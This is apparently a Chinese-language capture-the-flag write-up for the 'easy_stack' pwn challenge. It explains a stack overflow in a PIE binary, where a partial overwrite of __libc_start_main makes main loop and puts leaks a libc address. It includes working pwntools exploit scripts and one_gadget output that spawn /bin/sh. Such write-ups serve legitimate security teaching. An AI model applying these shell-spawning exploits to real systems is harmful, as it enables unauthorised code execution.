# EASY STACK

题目来源:http://pwn.eonew.cn/challenge.php

除了金丝雀其他都开了，主要麻烦点在PIE。程序包含栈溢出漏洞，但是无法使用ROP，也无法使得程序循环。这道题是通过部分地址写__libc_start_main来构成循环，字节拼接来泄露libc地址。

![Nz2TXH](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Nz2TXH.png)



**审计**

main函数中的缓冲区s发生过栈溢出，cpy操作在read_n函数中。最后时候会有一次输出puts，可以考虑用这个进行地址泄露。绕过PIE的原理参考萝卜师傅的[文章](https://www.anquanke.com/post/id/177520)

```
  read_n(&s, 0x100uLL);
  puts(&s);
```

可用用字符串拼接的方式来泄露main栈中的一些数据来泄露libc地址。

![image-20200504184851728](/Users/migraine/Library/Application Support/typora-user-images/image-20200504184851728.png)

此处是运行到ret处的栈空间，然后ESP指向处是__libc_start_main+231，一开始我认为这个位置我们需要用于控制程序流。所以往下寻找（实际上不必），找到ESP+0x90位置，发现这里的值与libc固定偏移4200243。所以可以将我们的字符串写到这个值的前方，最后会被puts输出。

![Ay6Yxf](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Ay6Yxf.png)

![aXFZsP](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/aXFZsP.png)

我们可以通过栈溢出，覆盖\x00来连接字符串，泄露ret时刻栈顶的__libc_start_main+231。

![qFNTPQ](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/qFNTPQ.png)

DEMO

```python
#!/usr/bin/python
from pwn import *

context.terminal = ['tmux','splitw','-h' ]
debug=1
#elf=ELF("./easy_stack")
if debug:
    p=process("./easy_stack")
    context.log_level='Debug'
    gdb.attach(p)
else:
    p=remote("nc.eonew.cn",10507)
s  = lambda data    :p.send(data)
sl = lambda data    :p.sendline(data)

payload="A"*(0x85+3)
sl(payload)

p.recv(0x88)
libc=u64(p.recv(6).ljust(8,"\x00"))
print hex(libc)

p.interactive()
```

但是PIE开启，无法跳转回main函数，也没办法使用gadgets。所以先考虑了一下部分地址爆破，考虑直接对__libc_start_main+231进行parital write，写低位爆破。但是system距离libc_start_main实在太远了。似乎还是不太行了。

![vXwk1T](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/vXwk1T.png)

![Gmj05D](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Gmj05D.png)

思路回到循环上，并且找到一个宝藏。学到一个新姿势，通过__libc_start_main函数来循环。（这个函数是libc中的函数，负责调用我们的main函数，并且在main结束时还会退出到这个函数）忽然理解了题目的提示，让我们好好看看libc，这是让我看源代码呀。

![6jPZgv](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/6jPZgv.png)

经过实验，发现只需跳转到__libc_start_main+0xb70就能实现main函数循环。

![xGRY8r](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/xGRY8r.png)

DEMO

```python
payload="A"*(0x85+3)+"\x70" #通过__libc_start_main+0xb70函数来循环
sl(payload)

p.recv(0x88)
libc=u64(p.recv(6).ljust(8,"\x00"))
print hex(libc)
```

其实地址泄露很简单，但是能够找到一个循环，真的很不容易。循环之后第二次写入，就可以getshell了。

EXP

```python
#!/usr/bin/python
from pwn import *

context.terminal = ['tmux','splitw','-h' ]
debug=1
#elf=ELF("./easy_stack")
if debug:
    p=process("./easy_stack")
    context.log_level='Debug'
    gdb.attach(p)
else:
    p=remote("nc nc.eonew.cn",10004)
s  = lambda data    :p.send(data)
sl = lambda data    :p.sendline(data)

payload="A"*(0x85+3)+"\x70"
sl(payload)

p.recv(0x88)
libc=u64(p.recv(6).ljust(8,"\x00"))-0x21b70
print hex(libc)
one_gadget=libc+0x4f2c5
payload="A"*(0x85+3)+p64(one_gadget)
s(payload)
p.interactive()
```

![lJnL7S](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/lJnL7S.png)



# 小结

- 新姿势，通过__libc_start_main函数来循环



```c
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
root@59b9934cad24:/ctf/work/EASYSTACK# one_gadget -l1 libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL

```

